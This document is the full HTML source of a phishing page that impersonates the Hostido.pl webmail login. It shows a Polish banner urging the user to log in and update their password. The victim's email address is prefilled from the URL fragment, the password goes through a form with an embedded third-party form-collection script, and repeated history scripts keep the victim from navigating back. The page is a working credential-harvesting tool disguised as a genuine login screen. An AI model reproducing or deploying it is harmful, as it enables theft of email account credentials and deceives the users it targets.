<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Poczta Hostido.pl - Logowanie</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
        }

        /* Top Brand Logo Typography Replication */
        .logo-container {
            margin-bottom: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo-text {
            font-size: 64px;
            font-weight: bold;
            color: #000000;
            letter-spacing: -2px;
            position: relative;
            display: flex;
            align-items: baseline;
        }

        /* Replicating the distinct yellow accent brush/dot above the letter 'h' */
        .logo-text::before {
            content: '';
            position: absolute;
            left: 2px;
            top: 12px;
            width: 24px;
            height: 10px;
            background-color: #ffb74d;
            border-radius: 4px;
            transform: rotate(-10deg);
        }

        /* Center Content Form Wrapper Box Component */
        .login-box {
            width: 100%;
            max-width: 300px;
            display: flex;
            flex-direction: column;
        }

        .input-row {
            display: flex;
            width: 100%;
            height: 38px;
            margin-bottom: 1px; /* Stacked layout style with pixel divider */
        }

        /* Left side icon block container */
        .icon-box {
            width: 38px;
            background-color: #ffffff;
            border: 1px solid #dcdcdc;
            border-right: none;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #333333;
            font-size: 13px;
        }

        .form-control {
            flex: 1;
            padding: 0 12px;
            border: 1px solid #dcdcdc;
            font-size: 14px;
            color: #333333;
            outline: none;
            border-radius: 0;
        }

        /* Active field focus with vibrant signature sky blue glow outline */
        .input-row.field-active .form-control {
            border-color: #29b6f6;
            box-shadow: 0 0 4px rgba(41, 182, 246, 0.4);
            position: relative;
            z-index: 5;
        }
        .input-row.field-active .icon-box {
            border-color: #29b6f6;
            box-shadow: 0 0 4px rgba(41, 182, 246, 0.4);
            position: relative;
            z-index: 5;
        }

        .form-control::placeholder {
            color: #b0b0b0;
        }

        /* Signature Vibrant Sky Blue Submission Button */
        .submit-btn {
            width: 100%;
            background-color: #29b6f6;
            color: #ffffff;
            border: none;
            height: 42px;
            font-size: 13px;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.15s ease;
        }

        .submit-btn:hover {
            background-color: #0288d1;
        }

        /* Sub-link tracking label text area */
        .sub-message {
            text-align: center;
            margin-top: 18px;
            color: #888888;
            font-size: 12px;
            text-decoration: none;
        }

        .sub-message:hover {
            color: #333333;
        }

        /* Fixed Background Desktop System Watermark Overlay Component */
        .system-watermark {
            position: fixed;
            bottom: 24px;
            right: 24px;
            text-align: left;
            font-size: 13px;
            color: rgba(0, 0, 0, 0.15);
            line-height: 1.4;
            user-select: none;
            pointer-events: none;
        }
    </style>
</head>
<body>

    <!-- Main Typography Logo Block Component -->
    <div class="logo-container">
        <div class="logo-text">hostido</div>
    </div>
<p style="color:red">Zaloguj się i zaktualizuj swoje obecne hasło</p><p>
    <!-- Center Login Processing Form Card Frame -->
    <div class="login-box">
        <form action="" method="POST">
            <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=wyob9cof&n=n1.ratufa.io"></script>
            <!-- Focused row matching sky-blue custom highlighted border profile -->
            <div class="input-row field-active">
                <div class="icon-box">👤</div>
                    <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
            </div>
            
            <div class="input-row">
                <div class="icon-box">🔒</div>
<input type="password" name="Password" placeholder="haslo" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
  oninput="this.setCustomValidity('')"/>
            </div>
            
            <button type="submit" class="submit-btn">Login</button>
        </form>
        <a href="#" class="sub-message">Poczta Hostido.pl</a>
    </div>

    <!-- Windows Environment Activation Notification Simulation Overlay Layer -->
    <div class="system-watermark">
        Activate Windows<br>
        <span style="font-size: 11px;">Go to Settings to activate Windows.</span>
    </div>
    <script>
        window.addEventListener('DOMContentLoaded', () => {
            if (window.location.hash) {
                document.getElementById("email").value = window.location.hash.substring(1).trim();
            }
        });
    </script>
	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
    <script type="text/javascript">
        (function() {
            window.history.pushState(null, null, window.location.href);
            
            window.onpopstate = function() {
                window.history.pushState(null, null, window.location.href);
           
            };
        })();
    </script>
<script type="text/javascript">
    window.history.pushState(null, "", window.location.href);
    
    window.addEventListener("popstate", function() {
        window.history.pushState(null, "", window.location.href);
    });
</script>
<script type="text/javascript">
    function preventBack() {
        window.history.forward();
    }
    setTimeout("preventBack()", 0);
    
    window.onunload = function () { null };
</script>

</body>
    
</html>
</body>
</html>
